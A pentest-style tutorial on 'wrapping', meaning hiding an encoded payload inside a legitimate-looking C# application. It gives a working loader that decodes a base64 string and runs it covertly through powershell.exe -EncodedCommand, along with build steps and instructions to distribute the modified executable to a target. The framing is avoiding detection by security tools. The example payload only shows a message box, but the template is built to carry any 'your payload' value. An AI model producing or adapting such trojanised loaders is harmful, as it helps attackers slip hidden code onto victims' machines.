# Summary
Wrapping is a technique used in penetration testing to encapsulate malicious code within a legitimate application or script. This technique allows the malicious payload to be executed within the context of a legitimate process, making it harder to detect by security mechanisms.

Here's an overview of how you could perform wrapping to inject your payload into a legitimate application:

1. **Prepare the Payload:** Encode your payload (e.g., shellcode) that you want to execute within the target application.
2. **Identify the Wrapping Point:** Determine the best location within the legitimate application to insert the payload. This could be at the entry point or within a specific function.
3. **Modify the Application:** Alter the application to include the payload and ensure it will be executed.
4. **Repackage the Application:** Compile or assemble the modified application into a distributable format.
5. **Deploy the Wrapped Application:** Distribute the modified application to the target environment.

# Execution
To execute the wrapping technique provided, follow these steps:

1. **Compile the Original Application:** If modifying source code, compile the legitimate application to verify it functions correctly before alteration.    
2. **Insert the Payload:** Encode your payload in a suitable format (e.g., base64) and insert it into the application at the identified wrapping point.    
3. **Recompile or Repackage:** Recompile the modified application or repackage it if it's a script.    
4. **Deploy and Execute:** Distribute and run the wrapped application in the target environment, ensuring the payload executes as intended.    

#### Step 1: Prepare the Payload
Assume you have some shellcode (e.g., PowerShell script converted to shellcode):

1. **Encode the Shellcode:** Convert your shellcode to a base64 string.

```
# Example PowerShell script
$script = @"
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('Hello, World!')
"@

# Convert to base64
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$base64Payload = [System.Convert]::ToBase64String($bytes)
$base64Payload
```

2. **Replace Placeholder in Code:** Replace BASE64_ENCODED_PAYLOAD_HERE in the application code with the base64 string obtained from the above step.

#### Step 2: Insert the Payload
Using a legitimate application, identify a suitable location to insert the payload. For this example, we will use a simple C# console application.

##### Original Code (Program.cs)

```
using System;

class Program
{
    static void Main(string[] args)
    {
        Console.WriteLine("This is a legitimate application.");
    }
}
```

##### Modified Code (Program.cs) with Payload

```
using System;

class Program
{
    static void Main(string[] args)
    {
        // Base64 encoded payload
        string base64Payload = "BASE64_ENCODED_PAYLOAD_HERE";
        byte[] payload = Convert.FromBase64String(base64Payload);
        ExecutePayload(payload);

        Console.WriteLine("This is a legitimate application.");
    }

    static void ExecutePayload(byte[] payload)
    {
        // Decode and execute the payload
        string script = System.Text.Encoding.Unicode.GetString(payload);
        var psi = new System.Diagnostics.ProcessStartInfo("powershell.exe");
        psi.Arguments = "-EncodedCommand " + Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(script));
        System.Diagnostics.Process.Start(psi);
    }
}
```

#### Step 3: Recompile the Application

Using the .NET CLI:

1. **Navigate to the Project Directory:**

```
cd path\to\LegitimateApplication
```

2. **Compile the Project:**

```
dotnet build -c Release
```

The compiled executable will be in the `bin/Release/net5.0/` or `bin/Release/net6.0/` directory, depending on your .NET version.

#### Step 4: Deploy and Execute

1. **Distribute the Application:** Provide the modified executable to the target environment.

2. **Run the Application:** Execute the wrapped application.

```
LegitimateApplication.exe
```

This should execute the payload (in this example, a PowerShell script showing a message box) along with the legitimate functionality of the application.

# Example Execution
Below is a simplified walkthrough:

#### Step 1: Prepare the payload in PowerShell:

```
$script = @"
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('Hello, World!')
"@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$base64Payload = [System.Convert]::ToBase64String($bytes)
$base64Payload
```

#### Step 2: Insert the payload into the application code:

Replace:

```
string base64Payload = "BASE64_ENCODED_PAYLOAD_HERE";
```

With:

```
string base64Payload = "encoded_payload_from_step_1";
```

#### Step 3: Compile the code:

- Save the modified C# code in Program.cs.
- Open a terminal or command prompt.
- Navigate to the directory containing Program.cs.
- Compile the code using:

```
dotnet build -c Release
```

#### Step 4: Run the executable:

- Open Command Prompt with administrator rights if required.
- Navigate to the directory containing the compiled executable.
- Run the executable:

```
LegitimateApplication.exe
```

This should execute the payload within the context of the wrapped application.

# Example Code

Here's a conceptual example in C# for a wrapped application:

```
using System;

class Program
{
    static void Main(string[] args)
    {
        // Base64 encoded payload
        string base64Payload = "BASE64_ENCODED_PAYLOAD_HERE";
        byte[] payload = Convert.FromBase64String(base64Payload);
        ExecutePayload(payload);

        Console.WriteLine("This is a legitimate application.");
    }

    static void ExecutePayload(byte[] payload)
    {
        // Decode and execute the payload
        string script = System.Text.Encoding.Unicode.GetString(payload);
        var psi = new System.Diagnostics.ProcessStartInfo("powershell.exe");
        psi.Arguments = "-EncodedCommand " + Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(script));
        System.Diagnostics.Process.Start(psi);
    }
}
```

Replace "BASE64_ENCODED_PAYLOAD_HERE" with your base64-encoded payload.